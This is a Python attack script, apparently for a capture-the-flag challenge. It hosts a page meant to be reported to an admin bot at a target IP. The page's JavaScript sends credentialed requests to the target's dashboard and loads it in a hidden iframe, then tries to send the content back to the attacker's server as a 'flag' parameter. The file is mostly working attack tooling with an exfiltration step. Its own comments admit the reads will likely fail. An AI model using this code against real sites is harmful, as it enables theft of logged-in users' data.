#!/usr/bin/env python3
"""
Simple HTTP server to host malicious page
Run with: python3 simple_server.py
Then expose with ngrok: ngrok http 8888
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        
        # Log all requests
        print(f"\n[REQUEST] {self.path}")
        if query:
            print(f"[QUERY] {query}")
            
            # Check if we received FLAG
            if 'flag' in query:
                print(f"\n{'='*70}")
                print(f"[FLAG RECEIVED] {query['flag'][0]}")
                print(f"{'='*70}\n")
        
        # Serve malicious HTML on root
        if parsed.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            html = b"""
            <html>
            <head><title>Loading...</title></head>
            <body>
            <h1>Please wait...</h1>
            <script>
                // Initial beacon
                fetch('/?step=1_loaded');
                
                // Wait for bot to login (happens after our page loads)
                setTimeout(() => {
                    fetch('/?step=2_fetching');
                    
                    // Try to fetch dashboard
                    // This will fail due to CORS, but let's try anyway
                    fetch('http://65.109.202.184/dashboard', {
                        credentials: 'include',
                        mode: 'no-cors'  // Might work for sending, can't read response
                    })
                    .then(() => fetch('/?step=3_fetched'))
                    .catch(e => fetch('/?step=error&msg=' + encodeURIComponent(e.toString())));
                    
                    // Alternative: Try to iframe it and read via timing
                    let iframe = document.createElement('iframe');
                    iframe.src = 'http://65.109.202.184/dashboard';
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    
                    fetch('/?step=4_iframe_created');
                    
                    // After iframe loads, try to read (will fail due to SOP)
                    setTimeout(() => {
                        try {
                            let content = iframe.contentDocument.body.innerHTML;
                            fetch('/?flag=' + encodeURIComponent(content));
                        } catch(e) {
                            fetch('/?step=5_cannot_read_iframe&err=' + encodeURIComponent(e.toString()));
                        }
                    }, 2000);
                    
                }, 8000);  // Wait 8 seconds for bot to login
            </script>
            </body>
            </html>
            """
            
            self.wfile.write(html)
        else:
            # For other requests, just respond OK
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

if __name__ == '__main__':
    port = 8888
    print(f"[*] Starting server on http://0.0.0.0:{port}")
    print(f"[*] Now run in another terminal: ngrok http {port}")
    print(f"[*] Then send the ngrok URL to bot via:")
    print(f"    curl -X POST http://65.109.202.184/report -d 'url=YOUR_NGROK_URL'")
    print(f"\n[*] Listening for requests...\n")
    
    server = HTTPServer(('0.0.0.0', port), Handler)
    server.serve_forever()
